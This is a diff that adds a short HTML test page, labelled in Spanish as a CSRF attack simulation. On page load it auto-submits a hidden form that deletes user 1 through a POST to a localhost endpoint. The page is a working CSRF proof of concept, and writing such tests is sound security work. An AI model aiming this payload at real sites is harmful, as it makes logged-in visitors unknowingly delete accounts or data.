@@ -1,0 +1,13 @@
+<!-- Simulación de ataque CSRF desde dominio externo -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Delete Test</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <form method="POST" action="http://localhost:8000/delete-user">
+    <input type="hidden" name="id" value="1" />
+  </form>
+  <p>Si ves esto, el CSRF se ejecutó automáticamente.</p>
+</body>
+</html>
